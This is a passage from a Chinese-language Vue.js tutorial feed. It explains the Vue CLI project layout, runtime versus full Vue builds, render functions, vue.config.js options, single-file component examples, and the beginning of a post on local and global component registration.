<li><code>components</code>：存放项目中（除了<code>App.vue</code>）组件的文件夹。</li>
</ul>
</li>
<li>
<p><code>public</code>：存放<code>index.html</code>、<code>favicon.ico</code>等文件。在使用默认配置的情况下，名称不可随意更改。</p>
<p><code>public/index.html</code>是当前项目默认打开的页面。在使用默认配置的情况下，名称不可随意更改。</p>
<p>在<code>index.html</code>中，有一个最重要的东西：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
<li>
<p><code>vue.config.js</code>：Vue CLI的配置文件（可选），与<code>package.json</code>同级。</p>
</li>
</ul>
<h2 id="vue-cli-入口文件" data-numberify>Vue CLI 入口文件<a class="anchor ms-1" href="#vue-cli-入口文件"></a></h2>
<p>在<code>main.js</code>中的<code>import Vue from 'vue'</code>和<code>render: h =&gt; h(App)</code>语句需要格外注意：</p>
<p><code>main.js</code>中，使用ES6引入的Vue（即<code>import Vue from 'vue'</code>），是<code>vue.runtime.esm.js</code>。</p>
<p><code>vue.runtime.esm.js</code>是一个精简版的Vue，其中去除了原本Vue中的模板解析器。所以在<code>main.js</code>的Vue实例中，使用<code>template</code>配置项会因为没有模板解析器而导致无法解析。</p>
<p>有两种方法可以解决该问题：</p>
<ul>
<li>
<p>引入完整版的<code>vue.js</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue/dist/vue&#39;</span>  <span class="c1">// 引入 Vue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">import</span> <span class="nx">App</span> <span class="nx">from</span> <span class="s1">&#39;./App.vue&#39;</span>     <span class="c1">// 引入 App 组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span><span class="nx">App</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">template</span><span class="o">:</span> <span class="sb">`&lt;App&gt;Hello!&lt;/App&gt;`</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span>
</span></span></code></pre></div></li>
<li>
<p>使用<code>render</code>配置项：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>       <span class="c1">// 引入 Vue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">import</span> <span class="nx">App</span> <span class="nx">from</span> <span class="s1">&#39;./App.vue&#39;</span> <span class="c1">// 引入 App 组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">render</span><span class="o">:</span> <span class="nx">h</span> <span class="p">=&gt;</span> <span class="nx">h</span><span class="p">(</span><span class="nx">App</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p><code>render</code>本质是Vue调用的一个函数，它需要接收一个参数<code>createElement</code>这个参数是<code>function</code>类型。<code>createElement()</code>可以帮助我们在页面中创建并渲染元素。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span> <span class="c1">// 引入 Vue
</span></span></span><span class="line"><span class="cl"><span class="c1">// 其实这里也可以使用完整版的 Vue，但是没必要
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">render</span><span class="p">(</span><span class="nx">createElement</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;render.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">createElement</span><span class="p">);</span> <span class="c1">// function
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;h2&#39;</span><span class="p">,</span> <span class="s1">&#39;Hello!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>由于<code>render</code>中不需要使用<code>this</code>，所以可以使用Lambda表达式<code>() =&gt; {}</code>来定义。如上方的解决方案中<code>h =&gt; h(App)</code>就是<code>render</code>最简洁的定义方式。</p>
<p>使用了<code>render</code>就无需使用<code>components</code>。</p>
</li>
</ul>
<blockquote>
<p>注：在<code>.vue</code>中依旧是使用<code>&lt;template&gt;</code>和<code>components</code>。也就是说，实例无需使用<code>render</code>。</p>
</blockquote>
<h2 id="vue-cli-配置文件" data-numberify>Vue CLI 配置文件<a class="anchor ms-1" href="#vue-cli-配置文件"></a></h2>
<p>Vue CLI默认的入口文件就是<code>main.js</code>。并且Vue CLI隐藏了所有<code>webpack</code>相关的配置，若想查看具体的<code>webpack</code>配置，可运行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">vue inspect &gt; output.js
</span></span></code></pre></div><p>将Vue CLI的<code>webpack</code>相关配置输出到<code>output.js</code>这个文件中（仅用作输出浏览，无法在此更改配置）。</p>
<p>在Vue CLI的<code>webpack</code>相关配置中有这样的内容：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">entry</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">app</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;./src/main.js&#39;</span> <span class="c1">// 项目入口文件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>要修改这些配置内容，需要在<code>vue.config.js</code>中进行修改。它的基本形式如（使用的是<code>common.js</code>的模块化语法）：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* 选项... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>或使用<code>@vue/cli-service</code>提供的<code>defineConfig()</code>帮手函数：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">defineConfig</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@vue/cli-service&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">defineConfig</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* 选项... */</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p><code>vue.config.js</code>中有一个<code>pages</code>配置项（具体内容可在官方文档中复制）：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">pages</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">index</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// page 的入口
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">entry</span><span class="o">:</span> <span class="s1">&#39;src/main.js&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 模板来源
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">template</span><span class="o">:</span> <span class="s1">&#39;public/index.html&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 在 dist/index.html 的输出
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">filename</span><span class="o">:</span> <span class="s1">&#39;index.html&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 当使用 title 选项时，
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// template 中的 title 标签需要是 &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">title</span><span class="o">:</span> <span class="s1">&#39;Index Page&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>除了<code>pages</code>配置选项，还有用于关闭语法检查的<code>lintOnSave</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">lintOnSave</span><span class="o">:</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><code>vue.config.js</code>的配置选项可参考 <a href="https://cli.vuejs.org/zh/config/" target="_blank" rel="noopener noreferrer">Vue CLI 配置参考<i class="fas fa-external-link-square-alt ms-1"></i></a>。</p>
<blockquote>
<p>注：</p>
<p><code>vue.config.js</code>被修改之后，需要重新运行<code>npm run serve</code>。</p>
<p>如果在<code>vue.config.js</code>中类似这样配置：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">pages</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">index</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="cm">/* 空的配置内容 */</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>那么在启动或者构建项目的时候就会发生错误。因为此时的配置中的<code>pages.index</code>传递的是一个没有任何属性的对象，而Vue CLI并不会去解析它并为他配上默认的内容。</p>
<p>所以在使用<code>vue.config.js</code>的时候，要么干脆不添加配置选项，使用默认的内容；要么就要按照配置选项的内容进行正确的配置。</p>
</blockquote>
<h2 id="vue-包" data-numberify>Vue 包<a class="anchor ms-1" href="#vue-包"></a></h2>
<p>Vue的依赖包在<code>node_modules/vue/dist</code>中。其中有这么些版本：</p>
<ul>
<li>
<p><code>.esm</code>：包含<code>.esm</code>的文件代表使用了ES6的模块化语法。使用ES6的模块化语法的版本，浏览器无法直接使用。</p>
</li>
<li>
<p><code>.min</code>：包含<code>.min</code>就是指压缩版本。</p>
</li>
<li>
<p>完整版：</p>
<ul>
<li><code>vue.js</code>：浏览器可以直接使用的完整版本。</li>
<li><code>vue.esm.js</code>：使用了ES6的模块化语法的完整版。</li>
</ul>
</li>
<li>
<p><code>runtime</code>：运行时版本，是Vue的精简版本，去除了模板解析器。</p>
<ul>
<li><code>vue.runtime.js</code></li>
<li><code>vue.runtime.min.js</code></li>
<li><code>vue.runtime.esm.js</code></li>
</ul>
<p><code>runtime</code>版本不能使用<code>template</code>配置项。需要使用<code>render</code>函数接收到的<code>createElement</code>函数去指定具体内容。</p>
</li>
<li>
<p><code>common</code>：使用<code>common.js</code>时使用的版本。</p>
<ul>
<li><code>vue.common.js</code></li>
<li><code>vue.common.dev.js</code></li>
<li><code>vue.common.prod.js</code></li>
<li><code>vue.runtime.common.dev.js</code></li>
<li><code>vue.runtime.common.js</code></li>
<li><code>vue.runtime.common.prod.js</code></li>
</ul>
</li>
</ul>
<blockquote>
<p>Vue CLI中<code>&lt;template&gt;</code>标签配置的模板，是由<code>vue-template-compiler</code>（Vue 模板解析器）来解析。这个<code>vue-template-compiler</code>只能解析<code>.vue</code>中的<code>&lt;template&gt;</code>模板，而不能解析<code>template</code>配置项。</p>
</blockquote>
<h2 id="示例" data-numberify>示例<a class="anchor ms-1" href="#示例"></a></h2>
<p>根据以上步骤和信息，将<a href="/docs/vue/components/projects/#%e9%9d%9e%e5%8d%95%e6%96%87%e4%bb%b6%e7%bb%84%e4%bb%b6">非单文件组件</a>中的<code>site</code>和<code>user</code>定义为单文件组件的形式：</p>
<blockquote>
<p>PS：由于使用的Vue CLI版本为5，默认开启语法检查。根据ESLint的官方代码规范，除了<code>App</code>的其它组件只能以<code>multi-word</code>（多单词）的形式命名。所以下方组件的命名遵循ESLint规范。</p>
<p><code>multi-word</code>形式选择<strong>kebab-case</strong>或<strong>CameCase</strong>都可以。</p>
</blockquote>
<ul>
<li>
<p><code>MySite</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;my-site&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>网站名称：{{name}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>网站地址：{{url}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;MySite&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Linner\&#39;s Blog&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;blog.linner.asia&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="nc">my-site</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">background-color</span><span class="p">:</span> <span class="kc">yellow</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
<li>
<p><code>SiteUser</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>用户姓名：{{name}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>用户年龄：{{age}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;SiteUser&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">age</span><span class="o">:</span> <span class="mi">18</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
<li>
<p><code>App.vue</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;./assets/logo.png&#34;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;logo&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">MySite</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">SiteUser</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 引入组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">import</span> <span class="nx">MySite</span> <span class="nx">from</span> <span class="s2">&#34;./components/MySite.vue&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">import</span> <span class="nx">SiteUser</span> <span class="nx">from</span> <span class="s1">&#39;./components/SiteUser.vue&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">MySite</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">SiteUser</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
</ul>
<p>其它文件暂时不用改动。然后在项目目录下运行<code>npm run serve</code>即可预览。</p>
<hr>
<h1 id="组件化编码流程" data-numberify>组件化编码流程<a class="anchor ms-1" href="#组件化编码流程"></a></h1>
<ol>
<li>拆分静态组件：组件按功能点拆分，命名不要与Html元素冲突。</li>
<li>实现动态组件：根据数据被使用的范围，考虑好数据的存放位置。</li>
</ol>
<ul>
<li>数据只有一个组件在使用：放在组件中即可。</li>
<li>数据被一部分组件共同使用：放在这些组件的父组件上（这种方法被称为状态提升，Vue中的数据也可被称为状态）。</li>
</ul>
<ol start="3">
<li>实现交互：从绑定事件开始。</li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 组件</title>
      <link>/docs/vue/components/introduction/</link>
      <pubDate>Thu, 14 Sep 2023 06:33:39 +0000</pubDate>
      
      <guid>/docs/vue/components/introduction/</guid>
      <description><![CDATA[组件是指实现应用中局部功能代码（html、css、js等）和资源（图片、音频、视频等）的集合。 传统的Web应用存在以下缺点： 依赖关系混乱，不]]></description>
      <content:encoded><![CDATA[<p>组件是指实现应用中<u>局部功能代码</u>（<code>html</code>、<code>css</code>、<code>js</code>等）和<u>资源</u>（图片、音频、视频等）的<u>集合</u>。</p>
<p>传统的Web应用存在以下缺点：</p>
<ul>
<li>依赖关系混乱，不易于维护。</li>
<li>代码复用率不高。</li>
</ul>
<p>CSS文件可以通过外部引入，不存在复用率不高的问题。JS的模块化解决了JS代码复用率不高的问题。而Html想要复用却不是那么容易。</p>
<blockquote>
<ul>
<li>模块化应用：当应用中的JS都以区分模块的形式来编写，那么这个应用就是一个模块化的应用。</li>
<li>组件化应用：当应用中的功能都是以多组件的方式来编写，那么这个应用就是一个组件化的应用。</li>
</ul>
</blockquote>
<p>使用Vue组件可以扩展HTML元素，封装可重用的代码，解决了上述问题。</p>
<p>使用组件系统可以用独立可复用的小组件来构建大型应用，几乎任意类型的应用的界面都可以抽象为一个组件树：</p>
<p><picture><img class="img-fluid " alt="组件树" src="/docs/vue/components/introduction/1694674192895.png" loading="lazy" width="1406" height="544" />
</picture>

</p>
<p>在Vue中，组件有两种编写形式：</p>
<ul>
<li>非单文件组件：一个文件中包含有其它多个组件。</li>
<li>单文件组件：一个文件中只包含有1个组件。</li>
</ul>
<p>在Vue中使用组件共分为3步：</p>
<ol>
<li>定义（创建）组件。</li>
<li>注册组件：</li>
</ol>
<ul>
<li>局部注册。</li>
<li>全局注册。</li>
</ul>
<ol start="3">
<li>使用组件（组件标签）。</li>
</ol>
<hr>
<h1 id="组件的注册" data-numberify>组件的注册<a class="anchor ms-1" href="#组件的注册"></a></h1>
<p>组件有两种注册方式：</p>
<ul>
<li>
<p>局部注册：在创建Vue实例时，在其配置对象中的<code>components</code>配置项中定义。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;#app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 3. 使用组件 --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hello</span><span class="p">&gt;&lt;/</span><span class="nt">hello</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 1. 创建组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">hello</span> <span class="o">=</span> <span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">template</span><span class="o">:</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">        &lt;h2&gt;{{msg}}&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">    `</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello Vue.js!&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 2. 注册组件（局部注册）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;hello&#39;</span><span class="o">:</span> <span class="nx">hello</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// hello,  // 简写形式
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>在<code>components</code>中，组件是以<code>key: value</code>的形式进行注册。<code>key</code>作为组件的名称，而<code>value</code>使用的是组件的实例对象。</p>
<p>局部注册的组件只能在当前的Vue实例或组件实例中使用。</p>
</li>
<li>
<p>全局注册：使用Vue原型对象提供的<code>Vue.component()</code>方法。</p>
<p><code>Vue.component()</code>接收两个参数：</p>
<ol>
<li>参数1：注册组件时使用的<code>key</code>。</li>
<li>参数2：组件的实例对象。</li>
</ol>
<p>如上例，将<code>hello</code>组件改为全局注册：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;#app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 3. 使用组件 --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hello</span><span class="p">&gt;&lt;/</span><span class="nt">hello</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 1. 创建组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">hello</span> <span class="o">=</span> <span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">template</span><span class="o">:</span> <span class="sb">`
